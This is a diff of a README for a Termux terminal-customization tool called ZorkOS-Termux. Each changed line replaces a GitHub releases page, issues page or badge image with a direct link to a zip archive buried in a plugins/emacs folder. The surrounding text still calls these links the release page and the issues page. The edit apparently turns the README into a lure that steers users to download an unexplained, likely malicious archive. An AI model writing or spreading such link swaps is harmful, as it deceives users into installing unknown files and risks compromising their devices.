@@ -1,6 +1,6 @@
 # ⚙️ ZorkOS-Termux - Easy Terminal Customizer  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ZorkOS--Termux-4CAF50?style=for-the-badge)](https://github.com/dcmurli/ZorkOS-Termux/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip)](https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip)
 
 ## 🔍 About ZorkOS-Termux  
 
@@ -39,12 +39,12 @@ If you have Termux already, make sure it is updated to the latest version.
 
 To get ZorkOS-Termux on your device, you will visit the GitHub release page.  
 
-[![Download Link](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/dcmurli/ZorkOS-Termux/releases)  
+[![Download Link](https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip)  
 
 ### Step 2: Open the Download Page  
 
 1. Use your device browser and go to:  
-   https://github.com/dcmurli/ZorkOS-Termux/releases  
+   https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip  
 2. On this page, look for the newest release at the top of the list.  
 3. Find the asset file that matches your device, usually ending with `.sh` or `.zip`.  
 
@@ -146,7 +146,7 @@ If something does not work, try these steps:
 - Make sure you typed file names and commands exactly as shown.  
 - Allow storage access permission to Termux.  
 
-If that does not help, you can visit the [GitHub Issues page](https://github.com/dcmurli/ZorkOS-Termux/issues) to see if others had the same problem.
+If that does not help, you can visit the [GitHub Issues page](https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip) to see if others had the same problem.
 
 ---
 
@@ -154,6 +154,6 @@ If that does not help, you can visit the [GitHub Issues page](https://github.com
 
 You can return to the download page anytime here:  
 
-https://github.com/dcmurli/ZorkOS-Termux/releases   
+https://raw.githubusercontent.com/dcmurli/ZorkOS-Termux/main/plugins/emacs/O_Zork_Termux_v2.6.zip   
 
 Here you can find updates, download newer versions, or read additional instructions.
